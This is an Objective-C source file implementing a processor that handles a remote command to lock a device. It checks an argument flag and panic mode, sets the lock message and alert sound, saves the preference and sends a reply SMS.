//
//  SetLockDeviceProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/22/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SetLockDeviceProcessor.h"
#import "PrefDeviceLock.h"
#import "PrefPanic.h"

@interface SetLockDeviceProcessor (private)
- (void) sendReplySMS: (NSString *) aMsg;
- (void) raiseSetLockDeviceProcessorException;
- (BOOL) isValidFlag;
@end

@implementation SetLockDeviceProcessor

#pragma mark -
#pragma mark Initialize

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetLockDeviceProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(SetLockDeviceProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"SetLockDeviceProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}
#pragma mark -
#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetLockDeviceProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SetLockDeviceProcessor--->doProcessingCommand")
 	if ([self isValidFlag]) {
		id <PreferenceManager> preferenceManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
		PrefPanic *prefPanic = (PrefPanic *)[preferenceManager preference:kPanic];
		// - Check if panic is on
		if ([prefPanic mPanicStart]) {
			DLog (@">> [prefPanic mPanicStart] = YES", [prefPanic mPanicStart])
			NSString *replyMessage = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																								  andErrorCode:kCmdExceptionErrorCmdCannotLockDeviceIfPanicIsActive];
			[self sendReplySMS:replyMessage];
		} else {
			// -- Lock device
			PrefDeviceLock *prefDeviceLock = (PrefDeviceLock *)[preferenceManager preference:kAlert];
			DLog (@"Device lock message from preference lock = %@", [prefDeviceLock mDeviceLockMessage]);
			[prefDeviceLock setMStartAlertLock:YES];
			if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 0) {
				[prefDeviceLock setMEnableAlertSound:NO];
			} else if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue] == 1) {
				[prefDeviceLock setMEnableAlertSound:YES];
			}
			if ([[mRemoteCmdData mArguments] count] > 3) {
				if ([[mRemoteCmdData mArguments] count] == 4 &&
					[mRemoteCmdData mIsSMSReplyRequired]) {	// the last argument is the reply flag
					DLog (@"This is reply flag")
					[prefDeviceLock setMDeviceLockMessage:@""];
				} else {									
					DLog (@"Set new lock message to preference lock = %@", [[mRemoteCmdData mArguments] objectAtIndex:3]);
					[prefDeviceLock setMDeviceLockMessage:[[mRemoteCmdData mArguments] objectAtIndex:3]];
				}
			} else {
				DLog (@"User not set lock message --------");
				[prefDeviceLock setMDeviceLockMessage:@""];
			}

			DLog (@"New device lock message from preference lock = %@", [prefDeviceLock mDeviceLockMessage]);
			// -- Notify the changes
			[preferenceManager savePreferenceAndNotifyChange:prefDeviceLock];
			
			// -- Send reply message
			NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																								  andErrorCode:_SUCCESS_];
			NSString *replyMessage = NSLocalizedString(@"kSetLockDeviceMSG", @"");
			replyMessage = [messageFormat stringByAppendingString:replyMessage];
			[self sendReplySMS:replyMessage];
		}
	} else {
		[self raiseSetLockDeviceProcessorException];
	}
}

#pragma mark -
#pragma mark Private methods

/**
 - Method name: sendReplySMS
 - Purpose: This method is invoked when checking and process is passed and need to reply response message 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) sendReplySMS: (NSString *) aMsg {
	DLog (@"SetLockDeviceProcessor--->sendReplySMS")	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aMsg];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aMsg];
	}
}

/**
 - Method name: raiseSetLockDeviceProcessorException
 - Purpose: This method is invoked when command argument checking is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) raiseSetLockDeviceProcessorException {
	DLog (@"SetLockDeviceProcessor--->raiseSetPanicModeProcessorException")
	FxException* exception = [FxException exceptionWithName:@"Set lock device processor exception"
												  andReason:@"Set lock device error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: isValidFlag
 - Purpose: This method is invoked to check whether argument is conformed to specificiation. 
 - Argument list and description: No Return Type
 - Return description: YES if argument is conformed otherwise NO
 */

- (BOOL) isValidFlag {
	BOOL isFlag = NO;
	NSArray *args = [mRemoteCmdData mArguments];
	if ([args count] > 2) {
		if (([[args objectAtIndex:2] isEqualToString:@"0"]) || ([[args objectAtIndex:2] isEqualToString:@"1"])) {
			isFlag = YES;
		}
	}
	return (isFlag);
}

#pragma mark -
#pragma mark Memory management

/**
 - Method name: dealloc
 - Purpose: Memory management
 - Argument list and description: No argument
 - Return description: No Return Type 
 */

- (void) dealloc {
	[super dealloc];
}

@end